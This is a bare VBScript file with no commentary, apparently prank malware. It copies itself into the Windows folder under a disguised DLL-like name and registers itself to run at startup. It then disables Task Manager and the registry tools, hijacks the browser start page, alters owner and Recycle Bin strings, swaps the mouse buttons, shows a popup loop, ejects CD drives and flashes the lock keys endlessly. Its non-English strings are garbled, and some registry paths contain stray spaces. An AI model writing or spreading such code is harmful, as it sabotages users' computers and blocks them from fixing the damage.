on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(0)+"\u ser32dll.vbs"
s.regwrite"HKLM\Software\Microsoft\Windows\Current Version\Run\RunExplorer32",fso.GetSpecialFolder(0) +"\user32dll.vbs"
s.regwrite"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://forum.hackersoft.ru"
s.regwrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\LocalizedString","������� ������"
s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","�����"
s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","������� �"
s.regwrite"HKCU\Software\Microsoft\Windows\Current Version\Policies\System\disabletaskmgr","1","REG_D WORD"
s.regwrite"HKCU\Software\Microsoft\Windows\Current Version\Policies\System\disableregistrytools","1", "REG_DWORD"
s.run"rundll32 user32, SwapMouseButton"
i=1
while i>0 or i<0
S.popup "��� �������� � ���� �����",0, "����� ������!!!",0+16
i=i-1
wend
Set ww=CreateObject("WMPlayer.OCX.7")
Set cw=ww.cdromCollection
if cw.Count>=1 then
For i=0 to cw.Count-1
cw.Item(i).eject
next
End If

do
wscript.sleep 200
s.sendkeys"{capslock}"
wscript.sleep 200
s.sendkeys"{numlock}"
wscript.sleep 200
s.sendkeys"{scrolllock}"
loop